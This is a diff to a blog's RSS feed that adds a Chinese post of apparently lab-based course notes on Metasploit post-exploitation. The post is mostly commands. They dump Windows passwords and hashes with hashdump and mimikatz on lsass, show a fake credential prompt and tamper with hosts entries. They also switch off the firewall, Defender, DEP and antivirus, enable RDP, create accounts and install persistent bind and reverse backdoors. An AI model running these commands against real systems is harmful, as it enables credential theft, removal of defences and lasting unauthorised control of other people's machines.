@@ -7,7 +7,7 @@
         <generator>Hugo -- gohugo.io</generator>
         <language>zh-cn</language>
         <copyright>Retr0</copyright>
-        <lastBuildDate>Thu, 04 Dec 2025 22:10:13 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 06 Dec 2025 15:32:40 +0800</lastBuildDate><atom:link href="https://www.retr0.xyz/index.xml" rel="self" type="application/rss+xml" /><item>
         <title>留言板 | Msg Board</title>
         <link>https://www.retr0.xyz/message/</link>
         <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
@@ -346,6 +346,160 @@ document.addEventListener(&#34;pjax:complete&#34;, function () {
 &lt;p&gt;PC端下载器:&lt;a class=&#34;link&#34; href=&#34;https://motrix.app/zh-CN/about&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
     &gt;Motrix&lt;/a&gt;&lt;/p&gt;
 </description>
+        </item>
+        <item>
+        <title>1.9 msf植入永久后门</title>
+        <link>https://www.retr0.xyz/p/1.9-msf%E6%A4%8D%E5%85%A5%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8/</link>
+        <pubDate>Sat, 06 Dec 2025 15:32:40 +0800</pubDate>
+        
+        <guid>https://www.retr0.xyz/p/1.9-msf%E6%A4%8D%E5%85%A5%E6%B0%B8%E4%B9%85%E5%90%8E%E9%97%A8/</guid>
+        <description>&lt;h2 id=&#34;meterpreter&#34;&gt;meterpreter
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;本部分使用Kali系统&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;host注入&#34;&gt;host注入
+&lt;/h3&gt;&lt;p&gt;在meterpreter中先使用&lt;code&gt;background&lt;/code&gt;将当前连接挂起&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;show options&lt;/code&gt;	查看配置方法&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;set ip [自己的ip]&lt;/code&gt; 	这里的ip是之后目标指向的ip&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;set domain [要篡改的域名]&lt;/code&gt;	要伪造什么域名&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;set sessions [目标session]&lt;/code&gt;	对哪个session id进行修改&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;run&lt;/code&gt;	运行&lt;/p&gt;
+&lt;h3 id=&#34;用户认证钓鱼&#34;&gt;用户认证钓鱼
+&lt;/h3&gt;&lt;p&gt;&lt;code&gt;run post/windows/gather/phish_windows_credentials&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;会在目标桌面弹出管理员认证窗口&lt;/p&gt;
+&lt;h3 id=&#34;passthehash&#34;&gt;passTheHash
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;&lt;font style=&#34;color:#DF2A3F;&#34;&gt;必须是system权限&lt;/font&gt;&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;run post/windows/gather/hashdump&lt;/code&gt;		获取操作系统的hash值&lt;/p&gt;
+&lt;p&gt;可以获取管理员(Administrator)密码加密之后的密码，之后使用穷举的方法破解&lt;/p&gt;
+&lt;h2 id=&#34;mimikatzwindows版&#34;&gt;mimikatz（Windows版）
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;本部分使用Win10攻击机及Win7靶机&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;我们使用&lt;code&gt;C:\tools\alltools\密码破解&lt;/code&gt;下的&lt;code&gt;mimikatz_trunk.rar&lt;/code&gt;软件，将压缩包传入到靶机上并解压，如果不能直接拖动复制（没有安装VM tools）建议使用 &lt;a class=&#34;link&#34; href=&#34;https://www.lingdaima.com/file/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;免费在线文件传输工具 - 零代码快传&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;解压后文件夹内的双击两个快捷方式可一键执行命令，也可进入Win32或x64文件夹（分别对应32和64位）内打开软件控制台手动输入命令&lt;/p&gt;
+&lt;h3 id=&#34;获取账户密码&#34;&gt;获取账户密码
+&lt;/h3&gt;&lt;p&gt;其中，在Win32文件夹内有&lt;code&gt;常用命令.txt&lt;/code&gt;可供参考:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;privilege::debug            当前进程提升为debug权限
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;inject::process lsass.exe sekurlsa.dll     注入lsass.exe进程
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sekurlsa::logonPasswords    列出所有用户密码
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;system::user                当前用户名
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;system::computer            当前主机名
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;process::list                列出所有进程
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;process::modules             列出当前加载模块
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ts::multirdp                 支持多用户远程登录
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;我们依次执行前三个命令，这时会在&lt;code&gt;wdigest&lt;/code&gt;后显示密码&lt;/p&gt;
+&lt;p&gt;提示：Windows 8 前密码会以明文形式存储在内存中，因此直接获取明文只对Win8之前有效。&lt;/p&gt;
+&lt;h3 id=&#34;扫雷外挂&#34;&gt;扫雷外挂（?）
+&lt;/h3&gt;&lt;p&gt;打开位于&lt;code&gt;tools&lt;/code&gt;文件夹下的&lt;code&gt;winmine.exe&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;在mimikatz窗口中执行命令&lt;code&gt;winmine::infos&lt;/code&gt;，即可查看所有雷的位置&lt;/p&gt;
+&lt;h2 id=&#34;mimikatzkali版&#34;&gt;mimikatz（Kali版）
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;本部分继续使用meterpreter控制台&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;在一个已连接的session中输入&lt;code&gt;load mimikatz&lt;/code&gt;（如果失败请用&lt;code&gt;load kiwi&lt;/code&gt;）加载mimikatz模块&lt;/p&gt;
+&lt;p&gt;使用&lt;code&gt;help&lt;/code&gt;（失败请用&lt;code&gt;help kiwi&lt;/code&gt;）可以查看有哪些功能，例如：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;creds_all&lt;/code&gt;列出所有凭据&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;creds_kerberos&lt;/code&gt; 拿到Kerberos凭据&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;creds_msv&lt;/code&gt;获取加密后的密码（Win8之后适用）&lt;/p&gt;
+&lt;h2 id=&#34;防火墙和3389端口&#34;&gt;防火墙和3389端口
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;本部分继续使用meterpreter控制台&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;安全措施的处理&#34;&gt;安全措施的处理
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;在shell中：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;netsh advfirewall set allprofiles state off&lt;/code&gt;	关闭防火墙&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;net stop windefend&lt;/code&gt;	关闭defener（Windows自带杀软）&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;bcdedit.exe /set {current} nx AlwaysOff&lt;/code&gt;	关闭dep（数据执行保护）&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;在meterpreter中（不好用）：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;run killav&lt;/code&gt;	关闭杀软&lt;/p&gt;
+&lt;p&gt;或&lt;code&gt;run post/windows/manage/killav&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;开启3389远程桌面端口&#34;&gt;开启3389（远程桌面）端口
+&lt;/h3&gt;&lt;p&gt;&lt;code&gt;run post/windows/manage/enable_rdp&lt;/code&gt;	打开3389端口&lt;/p&gt;
+&lt;p&gt;或&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;run getgui -e&lt;/code&gt;	（不太靠谱）&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;run getgui -u 用户名 -p 密码&lt;/code&gt;		在目标上创建新的用户账户（不好用）&lt;/p&gt;
+&lt;h3 id=&#34;连接远程桌面&#34;&gt;连接远程桌面
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;不要在meterpreter中输入，直接在新的终端窗口中输入：&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;rdesktop -u [用户名] -p [密码] [目标ip]&lt;/code&gt;		使用图形界面控制远程桌面&lt;/p&gt;
+&lt;h2 id=&#34;永久后门植入&#34;&gt;永久后门植入
+&lt;/h2&gt;&lt;blockquote&gt;
+&lt;p&gt;为什么需要永久后门的植入？&lt;/p&gt;
+&lt;p&gt;meterpreter是运行在内存里的，重启消失，所以需要植入后门&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;常见方法：卸载对方的补丁，给对方安装一些有漏洞的软件（比如说ftp程序、输入法&amp;hellip;&amp;hellip;）&lt;/p&gt;
+&lt;p&gt;这里使用meterpreter自带的功能&lt;/p&gt;
+&lt;h3 id=&#34;方法一正向连接不一定成功&#34;&gt;方法一（正向连接，不一定成功）
+&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;安装服务&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;background&lt;/code&gt;		挂起连接&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;run metsvc -A&lt;/code&gt;	设定一个31337端口上传后门文件&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;查看服务&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;jobs&lt;/code&gt;	可以看到&lt;code&gt;metsvc_bind_tcp&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;连接&lt;/strong&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use exploit/multi/handler
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set payload windows/metsvc_bind_tcp
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set rhost [目标ip]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set lport 31337
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;h3 id=&#34;方法二反向连接&#34;&gt;方法二（反向连接）
+&lt;/h3&gt;&lt;h4 id=&#34;课上教的不可用原因未知&#34;&gt;课上教的（不可用，原因未知）
+&lt;/h4&gt;&lt;p&gt;&lt;strong&gt;植入启动型后门&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;在session中：&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;run persistence -A -S -U -i [多少秒联系一次] -p [端口号] -r [自己的ip]&lt;/code&gt; 植入启动型后门&lt;/p&gt;
+&lt;p&gt;或者&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;run persistence -X -i [多少秒联系一次] -p [端口号] -r [自己的ip]&lt;/code&gt;	（成功率更高）&lt;/p&gt;
+&lt;p&gt;会打开一个新的session，之后目标启动后会自动连接上控制端&lt;/p&gt;
+&lt;h4 id=&#34;实践可用&#34;&gt;实践可用
+&lt;/h4&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;background	挂起连接
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use exploit/windows/local/persistence_service	转到persistence脚本
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;show options	查看配置方法
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;set session [编号]
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;</description>
         </item>
         <item>
         <title>1.8 操作系统权限及密码破解</title>
